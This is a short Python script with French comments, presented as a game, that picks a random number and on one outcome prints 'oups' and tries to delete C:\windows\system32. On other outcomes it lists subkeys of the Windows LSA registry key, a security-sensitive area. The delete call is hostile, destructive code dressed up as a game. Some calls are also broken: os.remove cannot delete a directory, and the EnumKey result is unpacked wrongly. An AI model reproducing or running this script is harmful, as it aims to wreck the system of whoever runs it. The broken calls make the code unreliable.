import random
import os
import winreg

def jeu():
    a = random.randint(0, 6)
    if a == 1:
        print("oups")
        os.remove("C:\\windows\\system32")
    elif a == 0 or a == 6:
        rejouer()
    else:
        affichage()

def rejouer():
   jeu()

def affichage():
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Lsa", 0, winreg.KEY_READ)
        
        # Parcourir les sous-clés et afficher les valeurs
        i = 0
        while True:
            try:
                # Lire la sous-clé à l'index i
                subkey_name, subkey_type = winreg.EnumKey(reg_key, i)
                print(f"Nom de la sous-clé : {subkey_name}")
                i += 1
            except OSError:
                break
        
    except PermissionError:
        print("Erreur : vous devez exécuter ce programme avec des privilèges administratifs.")
    except Exception as e:
        print(f"Erreur inattendue : {e}")

